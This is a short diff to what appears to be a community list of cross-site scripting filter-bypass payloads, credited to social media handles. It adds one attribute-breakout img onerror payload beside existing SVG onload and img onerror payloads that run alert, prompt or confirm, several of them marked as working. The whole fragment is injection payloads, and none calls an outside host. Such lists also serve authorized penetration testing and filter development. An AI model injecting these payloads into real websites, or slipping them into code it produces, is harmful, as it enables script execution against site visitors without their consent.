@@ -24,3 +24,4 @@ test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
 <svg on onload=(alert)(document.domain)> -@zapstiko
 <svg/on%20onload=alert(1)> (working) -@aufzayed
 <img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi
+"><img src=x onerrora=confirm() onerror=confirm(1)>
